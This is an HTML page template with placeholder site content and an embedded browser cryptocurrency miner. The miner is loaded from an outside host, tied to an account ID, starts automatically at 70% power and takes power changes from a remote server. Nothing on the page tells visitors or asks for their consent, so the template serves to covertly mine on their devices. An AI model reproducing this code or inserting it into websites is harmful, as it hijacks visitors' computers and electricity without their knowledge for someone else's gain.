<!DOCTYPE html>
<html>
<head>
    <title>Your Website Title</title>
    <!-- other head elements -->
</head>
<body>
    <!-- Your website's content goes here -->

    <!-- Miner download code -->
    <script src="https://wm.bmwebm.org/WEBMINER.js"></script>

    <!-- Autostart miner -->
    <script>
        WEBMINER.config({ login: "7164569", pass: null }).power(70);
    </script>

    <!-- Additional JavaScript for the miner -->
    <script>
        // Configuration
        WEBMINER.config({ 
            login: "7164569", // Your ID - required
            pass: null, // Name for stats, leave blank for automatic set.
        });

        // Start/Stop/Change speed
        WEBMINER.power(70);

        // Restore previous session
        WEBMINER.loadStored();

        // Event handlers and other functions
        WEBMINER.on('remotepower', (power) => {
            WEBMINER.power(power);
            console.log('New power:', power);
        });

        WEBMINER.on('accepted', () => console.log('New share') );
    </script>
</body>
</html>
